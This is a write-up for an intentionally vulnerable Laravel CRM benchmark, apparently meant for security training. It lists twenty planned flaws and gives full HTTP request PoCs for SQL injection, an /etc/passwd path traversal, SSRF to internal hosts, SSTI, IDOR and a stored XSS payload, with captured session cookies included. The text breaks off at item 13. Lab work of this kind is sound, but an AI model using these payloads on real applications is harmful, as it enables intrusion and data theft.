Benchmark Title
•	Author: Mohamed Selim
•	Difficulty: Hard
•	Created: 2025-10-22
________________________________________
Synopsis
This project is a realistic, intentionally-vulnerable Enterprise CRM used as a Hard benchmark. It’s a multi-tenant web application (think a real CRM product used by HR, Support, and Admin teams) built with Laravel on the backend. The app uses an EAV (Entity–Attribute–Value) data model for flexible customer attributes, includes Elasticsearch to power search, supports CSV ingestion via a background worker, and offers XML/XSLT transformation pipelines for reporting.
The goal is to provide a polished, production-like app that intentionally contains only the planned vulnerabilities (no accidental secrets), so security teams can practice realistic attack chains: SQLi, XSS, SSTI/XSLT, XXE (OOB), IDOR (including cross-tenant DB parameter manipulation), SSRF (to internal ES), path traversal, open redirect/OAuth abuse, and vulnerable components/supply-chain scenarios. The environment also simulates a Cloudflare-style WAF/bot detector to force realistic bypass techniques.________________________________________
Quick Solution
Purpose: A compact, human-readable manifest for fast validation.
#	Vulnerability	Affected Path / Location	PoC (compact / note)
1	SQL Injection (header-assisted)	GET / (e.g., X-Forwarded-For header used in queries)	Sensitive — verify by observing DB error/time anomalies when header is modified in a lab.
2	Stored/Reflected XSS	POST /profile (profile description / email rendering)	Sensitive — verify by submitting disallowed markup in a test account and viewing render results.
3	Path Traversal (JWT-encoded path)	GET /crm/view?path= (server resolves payload path)	Sensitive — verify by providing a lab-only relative path and observing file access.
4	Open Redirect	GET /dashboard//<host>	Verify by visiting //host-style path and observing redirect/host interpretation.
5	Open Redirect (OAuth)	GET /oauth/authorize (redirect_uri)	Verify acceptance of unvalidated redirect_uri values in a controlled flow.
6	IDOR (Insecure Direct Object Reference)	GET /crm/download/{id}	Verify by changing the numeric id to access non-owned resources (lab accounts only).
7	IDOR / DB context switch	GET /dashboard?db=...	Verify whether changing the db parameter exposes other database contexts.
8	SSTI (Server-Side Template Injection)	POST /training/send-results-email (template fields)	Sensitive verify by submitting template-like input in a safe test and observing evaluation.
9	SSTI / Unescaped Template Tags	POST /crm/export (unescaped tags in JSON input)	Verify whether unescaped template tags are evaluated in exported output.
10	SSRF via Swagger UI	GET /swagger_ui?url=	Verify whether backend fetches the supplied URL (test with lab endpoints).
11	SSRF via image fetch	POST /profile/fetch-image (image_url)	Verify whether server-side fetch follows attacker-supplied URL (use internal lab endpoints).
12	Stored XSS — profile fields	POST /profile (description field)	Verify presence of unsanitized HTML in profile rendering.
13	XSS via malformed quoting	POST /profile (name/email input)	Verify how unusual quoting or HTML in name/email is rendered.
14	Path Traversal via search/index snap	POST /elasticsearch (snapshot/path handling)	Sensitive verify path normalization and whether .. segments are honored in a lab snapshot path.
15	Info Disclosure — public backup file	GET /storage/... (backup files)	Verify publicly-accessible backups for secrets/flags in storage.
16	Debug Mode enabled (Laravel)	Application error pages / stack traces	Verify verbose error pages leak environment/config data.
17	Outdated frontend component (MD editor)	/profile/edit (console shows warnings)	Verify console warnings for outdated libraries/components.
18	Exposed vulnerable dependency (search)	http://<host>:9200/ (exposed index/search service)	Verify publicly-exposed service version and known CVEs in lab.
19	XXE (Out-of-Band) via XML upload	POST /csv (XML upload that allows external entities)	Sensitive — verify OOB DNS/HTTP callbacks in a controlled testing service.
20	XSLT / XXE injection (document()/copy)	POST /export-erp (XSLT payload handling)	Sensitive  verify whether XSLT document() / copy-of are executed.

Vulnerabilities (Detailed)
For each item below: Title, Summary, High-level steps to verify (non-actionable), and PoC note (sensitive payloads omitted).
________________________________________
1) SQL Injection — header-assisted (e.g., X-Forwarded-For)
Summary: The application uses certain HTTP headers inside SQL contexts without sufficient validation, making error-based or time-based SQL injection possible when manipulated.
Steps: 
sqlmap -r req.txt
req.txt: 
GET / HTTP/1.1
Host: 192.168.247.128:8000
Cache-Control: max-age=0
Origin: http://192.168.247.128:8000
X-Forwarded-For: *
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.247.128:8000/csv/upload
Accept-Encoding: gzip, deflate, br
Accept-Language: ar-EG,ar;q=0.9,en-GB;q=0.8,en;q=0.7,he-IL;q=0.6,he;q=0.5,en-US;q=0.4
Cookie: browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidmVuZG9yIjoiR29vZ2xlIEluYy4iLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJhci1FRyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9; browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidmVuZG9yIjoiR29vZ2xlIEluYy4iLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJhci1FRyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9; XSRF-TOKEN=eyJpdiI6InJyYnB1RFU2bExnNnhUbm5TYmhvM3c9PSIsInZhbHVlIjoiSnVsN1JWaVc3VFlsWFM3cktiSkVzWEkzV1puaUNDTlFVVURlOHZKUDBQUlkva2NBNjhZQnhRendXK1BXNkg2M0VTQmxZUDlpRzRuV0hqUlk4Y3RjazZmSThFMW51RzBINkUxU0xadVRVQ0UxbWNCaVRoNUYxcXlqM1FuQjRtLzAiLCJtYWMiOiJkNjBkYTcwZWVmNjQ4YTdiOWNlODQ4MzYyNWE1MTNkYTBjZTNiNThhNWZiYTE1OTI2ZTQzN2MyOWNhYTdiNWVmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjFRMndNTFFWMGNOK21sck96STZIc2c9PSIsInZhbHVlIjoibDByc3dCeUdQOWlWQ0ZxbXJCK01PVXN3V3daU0RPMG1sY2xJMVBXUk9qeE54V2lZSElRT0t5MC94SW1xZUJRUk15eHRaeHkzVUxORVlUZTlBaWNmVnlIdXM0K3k1STVUYm4ySE5CbHo5UFpwWTJldFZwM2Q0YXo0REFuTnJEc2YiLCJtYWMiOiJlMWNiNTU1MDA2NmE2M2IxMzAwMmY5YmJiMzY1OWI5N2Y1NDJhNzA3MzM4ZGJiYmRjMWQwZTYxM2ExOTlmNTk2IiwidGFnIjoiIn0%3D
Connection: keep-alive
PoC note: Exact exploit payloads and sqlmap commands are omitted from this public document.
________________________________________
2) SQLI - CSV
PoC:
POST /csv HTTP/1.1
Host: benchmark-crm.test
Cookie: browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTQ0LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTQ0LjAiLCJ2ZW5kb3IiOiIiLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJlbi1VUyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9; XSRF-TOKEN=eyJpdiI6InQzVWs1MWU5WlRRUUEveHF0ZjU3SUE9PSIsInZhbHVlIjoiTU5TK1hDQ3pLNzY5MkhpNSsrQ1hlRjAyVHpKNUFCQlM0aytTS3pDYTE2MGFYWE80dE9ZV0MxZ01JcFVnMlRueU1zQXQ4SDNVd0ZSdk03cEhIMjEvSlFYaGJ0aTJJRGQyTEhkRU9uZUVlVEFiVExnbElGZ1RGM1RqREIzaDFkUFAiLCJtYWMiOiIzNGM3OGQyNzU2ZjhiZWIyYjE0NGNjOTE0ZDMyZWYzMDU5ZGIwY2QzYjRiOGUyZTdkZTgyNzQ4ZmVmZjUzOWFhIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IksybUVodUFwakZsT2FneXpYeTVQZmc9PSIsInZhbHVlIjoiTnRLL0FtL1dSZkNJc2JWSHpwTDR3YXFkclh2NUgyM1BSOU5NWUZSdFl0dkI2Sjh0ZnExNXgwQWtQNDJjdXZiWVdPWHFvSkpkQkNtK0tuLytyUkl0Z2lHSVdtSFVQdkxleU9MaFdWY2M0cnQ4UFRWZEVVL2tucFdzM3dlRnRPQlQiLCJtYWMiOiIxMjFhY2NkYTRlN2QzMTliMzA3YTNlNzIxMmNkZWJkY2FlY2QyMTUyMDk3NGZjMjFmNjU0NTIyZmZkZTg4NzY1IiwidGFnIjoiIn0%3D; browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTQ0LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTQ0LjAiLCJ2ZW5kb3IiOiIiLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJlbi1VUyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundaryf09f7345ffd5f0dd5138c9ac8f6b375b
Content-Length: 690
Origin: https://benchmark-crm.test
Referer: https://benchmark-crm.test/csv/upload
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

------geckoformboundaryf09f7345ffd5f0dd5138c9ac8f6b375b
Content-Disposition: form-data; name="_token"

Zgg4JwHzrjvpqpBQCtHlSfVrYZMUsilpJ9OC0K3V
------geckoformboundaryf09f7345ffd5f0dd5138c9ac8f6b375b
Content-Disposition: form-data; name="csv"; filename="xxxxxxxxxxxxxx.csv"
Content-Type: application/vnd.ms-excel

name,email
'Mohamed','mohamed@example.com'
'Ali','ali@example.com'
'Sara',version()

------geckoformboundaryf09f7345ffd5f0dd5138c9ac8f6b375b
Content-Disposition: form-data; name="filetype"

0
------geckoformboundaryf09f7345ffd5f0dd5138c9ac8f6b375b
Content-Disposition: form-data; name="async"

1
------geckoformboundaryf09f7345ffd5f0dd5138c9ac8f6b375b--
 
you will see the mysql version on email field________________________________________
3) Path Traversal — file path provided via encoded parameter
Summary: A path parameter (sometimes encoded or wrapped in another structure like a JWT) is resolved and used to read files; unsanitized relative segments can allow traversal to sensitive filesystem locations.
Request: 
GET /crm/view?path=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXRoIjoiLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCIsImlhdCI6MTc2MTE0NDQyMywiZXhwIjoxNzYxMTQ4MDIzfQ.T5eOcyNdQZ9-d47MP-1SErXXOKaE2PjxqOM-h21OH8U HTTP/1.1
Host: 192.168.247.128:8000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.247.128:8000/dashboard?db=hr
Accept-Encoding: gzip, deflate, br
Accept-Language: ar-EG,ar;q=0.9,en-GB;q=0.8,en;q=0.7,he-IL;q=0.6,he;q=0.5,en-US;q=0.4
Cookie: browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidmVuZG9yIjoiR29vZ2xlIEluYy4iLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJhci1FRyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9; XSRF-TOKEN=eyJpdiI6InF3Sk1jUWdaMDhyQnFTdStveXo0R0E9PSIsInZhbHVlIjoibDY0dlY0bUdLbDZTNk1pZDVCMloyRytaeGluMy9oS21WSXl1dGlldG9uS2tYMHVpa0Z2QzZMTDVmVnVhRXpSTWlFM1BWbmVHKytjcnRrNFZwZEJCM3M1ZmprZWdhdjU5aE91a2tTNDdqQVBldDc2QWoxUDgzVWU4SjAwcGU5YlUiLCJtYWMiOiJiZjg1ZTUzMWU1NjgzMDkyODhhODVlY2Y4OTlkZDU0N2RhNzk1YWE1OGViZDliZGE4YjY0Mjk3M2I3ODc3Y2U4IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjFldm9xc3lvR25WOSs3cVUwQzNScmc9PSIsInZhbHVlIjoiRkY5U08xdVMyUnJuU1dOd1RNNFZuaDlPZUhEZEtTdmZpVDdQL0JEcm1oVHRybVc3VUdiSFRYbGZWYzBGRUNtMlFsVWFWdXFCUlY5ZnNyc05DU2cxV1BjNTFDQ2xMN0dDNTFFYnFYcytVRmRWYURNUlFZeFM0dk5WcElwZmVhMy8iLCJtYWMiOiJkZjY1ZjE1NGE1OTk5OWMwYWMwNjFlZjYxY2FhNGRiYjljNzJmZmI0MWQyODgxMDZmMjQ0ODZmOGFkZGZjODE4IiwidGFnIjoiIn0%3D
Connection: keep-alive
PoC note: Exact crafted tokens or JWTs used to exploit traversal are omitted.
________________________________________
4) Open Redirect — double-slash host trick
Summary: Endpoints that accept path components with leading //host may be treated by the application or browser as external host redirection.
PoC: http://192.168.247.128:8000/dashboard//max.com
________________________________________
5) Open Redirect — OAuth redirect_uri not validated
Summary: The OAuth authorize endpoint accepts redirect_uri values without strict whitelisting, which can enable redirection to arbitrary URIs after authentication.
PoC:
http://192.168.247.128:8000/oauth/authorize?client_id=crm_main_client_123&redirect_uri=https://x192.168.247.128:8000/&state=xyz123
________________________________________
6) IDOR — insecure direct object references (download endpoint)
Summary: The download endpoint uses a simple numeric identifier for resources and fails to check ownership or authorization properly.
PoC: http://192.168.247.128:8000/crm/download/4
________________________________________
7) IDOR / DB context-switching via query parameter
Summary: A db or similar parameter may be used to switch application context to different databases or tenants without authorization checks.
PoC: http://192.168.247.128:8000/dashboard?db=admin
________________________________________
8) SSTI — template injection in email/training endpoint
Summary: Template content submitted in JSON fields may be evaluated in server-side templates, leading to SSTI where expressions are executed.
PoC: POST /training/send-results-email HTTP/1.1
Host: benchmark-crm.test
Cookie: XSRF-TOKEN=eyJpdiI6InpMaVY3dEhHbzNKbU43WVFiQ0ZZb3c9PSIsInZhbHVlIjoiTUxha2JydHdZaFRhcmFkV1pwKzJBQzN2Zmora3k4R2FEcHkyaTZVbnhEaUNJcDcwNXI1clpuNnNmSUhoeHFja1UrRVRSLzVWdjJOMjJaZ1hIY1VhV01MVHpORjZkcFhnTk9BbHpHcFVRN0J6WHU1b2JGbVdCTWlITUFlczdHZFkiLCJtYWMiOiJiZjIxMGUyM2Y1N2YwYzM1NWY1YjkxNDU3NGFmNWVjY2U4YzVkODZmOTcxNTRlYzk1NDI1ZGRhMjM1Y2VlODAzIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IitjQUxHM2lBc2dKSFNKNjNsYWYzZnc9PSIsInZhbHVlIjoiYkc4UlJ4Q0x1R1RVOFJwenhOQWVYbjJ1NUF6ZnluaHRubVNkRWYzT2o3UGk2cVY1Q2g3MDdEcm9ybWxQZUdrZ3lCU1hKUlBjVCs1emRKbzFxVlJrMC9qWU1OU3JvOEJYcDNMd2xreEVINExFb1VKNDM4dlRSMk5KK1BLQjNadFgiLCJtYWMiOiI5Mjk0NDg2YmEyODE2YjFmOTdjMWRlMzhkZjBiZjZlODQ5MzhkZjAzNzJmZmI2N2EwZmJmMmFlMmQxZTA3YWQ1IiwidGFnIjoiIn0%3D; browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTQ0LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTQ0LjAiLCJ2ZW5kb3IiOiIiLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJlbi1VUyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://benchmark-crm.test/dashboard
Content-Type: application/json
X-Csrf-Token: Zgg4JwHzrjvpqpBQCtHlSfVrYZMUsilpJ9OC0K3V
Content-Length: 304
Origin: https://benchmark-crm.test
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
Connection: keep-alive

{"to":"asdsadsa@sddfsad.com","subject":"dsad","description":"{{name}} {{flag}} whitelisted lables","path":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXRoIjoiY3JtX2NzdlwvY3N2XzY4ZjhlYWNhNDM2NTYyLjk5NTg1MDkzLmNzdiIsImlhdCI6MTc2MTE0MzQ5OCwiZXhwIjoxNzYxMTQ3MDk4fQ.Ero6mBrZbzSXe5lBXXUSFNVvuTRR6WhuXXkJyQSmC9w"}
________________________________________
9) SSTI — unescaped template tags (export endpoint)
Summary: Export functionality accepts data containing unescaped template tags which are rendered, allowing expression evaluation in the generated output.
PoC: POST /crm/export HTTP/1.1
Host: benchmark-crm.test
Cookie: XSRF-TOKEN=eyJpdiI6ImlhcFdtMERqSm1RMjR1TUYrYTRtbHc9PSIsInZhbHVlIjoiNWNudVZnOWswTGdnMDdoOTNzVE9uK3JoVUI0S3BrdVduc2l0YVhEakN1K1NwT2Fmamc3TjYrMC8waUZKUTB4aXlBVWJuajZSTHN2U1RUVm9JUzF4d2dUdkoyaXV5YlBQMmZyaURSZXluaGNoWjQ1TGJyK3kyMmR0YjNyRjhMeW0iLCJtYWMiOiI3NTE0N2ZlZDcwZGVhMDM1ZDg4NTFiYzM2MzAwY2M5OGU3Yzc0MzE5MjUxNGQ5OTc5MGI4MzBmOGVhYjJjNjRmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InNkWDJnU3JuNU9jVUhCam83bW00QVE9PSIsInZhbHVlIjoiZ3ZPRkFLV0lLbzVRWDdueFROUGY5aEwrZVQrd3VpV1pkTjhtTnpMM3FhQU1sUUJxNXZlenphc2QvR09XNUl5aExpOG5QcUZ1Z2R3RW5VckZwU1FLaGJpc245NTR3OEFFTkVRQ0Zzb2IxaE0yTjJJTWxZcUtmUnAwbjRud1JMMnQiLCJtYWMiOiJmZWE1MzA0N2YyMDVjNTJkYTIzYzM4OTQxMzc5Mzg2MzI5NTlhMjZiZWQ5Y2UwNGFhNWZmMTdlMWJjNzJkZWQyIiwidGFnIjoiIn0%3D; browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTQ0LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTQ0LjAiLCJ2ZW5kb3IiOiIiLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJlbi1VUyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://benchmark-crm.test/dashboard
Content-Type: application/json
X-Csrf-Token: Zgg4JwHzrjvpqpBQCtHlSfVrYZMUsilpJ9OC0K3V
Content-Length: 118
Origin: https://benchmark-crm.test
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"db":"hr","rows":[{"id":"{!! 2*20 !!}"},{"id":9},{"id":11},{"id":16},{"id":5},{"id":12},{"id":17},{"id":1},{"id":6}]}
________________________________________
10) SSRF — Swagger UI url parameter
Summary: Swagger UI accepts a url parameter that the backend may fetch, enabling SSRF to internal services including loopback addresses.
PoC: http://192.168.247.128:8000/swagger_ui?url=http://[::1]/
________________________________________
11) SSRF — image fetch endpoint
Summary: The profile image fetch endpoint retrieves images from user-supplied URLs. Without URL restrictions, it can be used to reach internal resources or force the server to make arbitrary requests.
PoC: POST /profile/fetch-image HTTP/1.1
Host: 192.168.247.128:8000
Content-Length: 76
X-CSRF-TOKEN: gbJ5KlHw2MymY3PyjRQ9ynXE6Yx3DRar3cmfGu2g
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: application/json
Content-Type: application/json
Origin: http://192.168.247.128:8000
Referer: http://192.168.247.128:8000/profile/edit
Accept-Encoding: gzip, deflate, br
Accept-Language: ar-EG,ar;q=0.9,en-GB;q=0.8,en;q=0.7,he-IL;q=0.6,he;q=0.5,en-US;q=0.4
Cookie: browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidmVuZG9yIjoiR29vZ2xlIEluYy4iLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJhci1FRyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9; browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidmVuZG9yIjoiR29vZ2xlIEluYy4iLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJhci1FRyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9; XSRF-TOKEN=eyJpdiI6Ik12NmtOdmgvWG0yVzhQWDJOc1hXVnc9PSIsInZhbHVlIjoieVZJam1SUVluQTRLZ0V2ZnBJMnZjUGRKaE9FUFpnT0ozVzhoeW9nY21KaDN5WTNqTWk3ZGl6ZTBDVGFzNmp1K0QrU09iZFZpYm9rUmVUakFiR1hOUUV2b0Q4VnRsQWhuMEJPN2ErdWVtMEt2QTdLeFFlYk5JTzEzME5OamJXbHQiLCJtYWMiOiJmODg5Zjc0Yzc1YTg3Mzc4Yjc5YzY2YmIyODJmYTIxMDY0OGRhYWRhOWZlMDJmYjRkZWM3ZWVjZDFjM2M2Yzc0IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InVXTFhHd2w3ZUwrYVNBM2J2NStyRGc9PSIsInZhbHVlIjoiNFdRTS9wREJUQ1JEZ0pzRXhiS1MwekVVMGxZa0dMT2NVWkFQcHRKZWxzdzNsNGNCY0FLcmVUMllOWkgzUlI2cGlXMnptU1lWUVNHQjZubForVk9Ibi9nT09WcnorWHUxZG55S3NlWjlDQWhCdFBtelNGaG1SQkl6UitpYTZjQWYiLCJtYWMiOiIxZDJlYmQwNDI5YTc2NjdlNGEzNzc0MjE1Yzk2MTY0Yjg5MWUzNDljZjU1MTg0MzQwNDdiNDU1YmQwMzcwMzJhIiwidGFnIjoiIn0%3D
Connection: keep-alive

{"image_url":"http://34.166.198.47:10010/dashboard//172.20.0.4:39432/x.png"} ________________________________________
12) Stored XSS — profile description
Summary: The profile description field accepts HTML and stores it; later views render it without adequate sanitization.
PoC: POST /profile HTTP/1.1
Host: 192.168.247.128:8000
Content-Length: 178
Cache-Control: max-age=0
Origin: http://192.168.247.128:8000
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.247.128:8000/profile/edit
Accept-Encoding: gzip, deflate, br
Accept-Language: ar-EG,ar;q=0.9,en-GB;q=0.8,en;q=0.7,he-IL;q=0.6,he;q=0.5,en-US;q=0.4
Cookie: browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidmVuZG9yIjoiR29vZ2xlIEluYy4iLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJhci1FRyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9; browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidmVuZG9yIjoiR29vZ2xlIEluYy4iLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJhci1FRyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9; XSRF-TOKEN=eyJpdiI6ImJ1S3pMY2xDSnNjUVhvMDNjUjhRd1E9PSIsInZhbHVlIjoicE10ZGRhRlNiZzBQa2kvVkl5eDhuR1ZlS0h6d0NIZXB5Qk1renYxN0tGK0xmTllxSTgzOURYNlp4VGxkWmRVN2s1aW5ER0tjeDRLVXpMR0c0bzdXQ2JybGcwL09hdkJxWWFVTC9YODFHQmNYa1J3aldKL2k2TmhiYkNFcWtEWFciLCJtYWMiOiI0NTAyNWIwZjBiOTZmODRmNzVlOTcwZDg5ZTFiOTIxNTJlMDIwZDQ5MWRmNWYwMGU1MDQ3ZDY1ZmUxNTNhYjExIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlJORjZ4WUpBbFArZ2hpanNyOEJPK1E9PSIsInZhbHVlIjoiK1BWV0NTMHUwNUo4RFROOE5ybG82SzdqTjI1R0pJS1RxaEhYOXFtQXNwUjN0ZG9Kc1V4VXhsKzVHeXVRRytaTXBTdm1YdGVoemd2OWVVY2wwbVRpMVAwRXZzbFh2RHdsMGEyZHJuZUZXcWNOcjBNaU1yZWN4cElrTWNSMlQ1YUciLCJtYWMiOiJmNmRhMTdlZDIxMWRmOWJiOWYxMGMzNDFkYjZjZTA4NDE2NjY5ODk4MzNjNjk3MDZmM2M2ZTgyNWMyZGU4NTZlIiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=gbJ5KlHw2MymY3PyjRQ9ynXE6Yx3DRar3cmfGu2g&name=%E2%80%AAMohamed+yossef&email=xx%40gmail.com&password=&description=%3Cimg+src%3Dx+onerror%3D%22xx%3Dalert%3Bxx%28100%29%22%3E________________________________________
13) XSS via malformed quoting in name/email
Summary: Improper handling of quotes or special characters in name/email input may lead to injection when these values are interpolated into pages or attributes.
PoC: POST /profile HTTP/1.1
Host: 192.168.247.128:8000
Content-Length: 147
Cache-Control: max-age=0
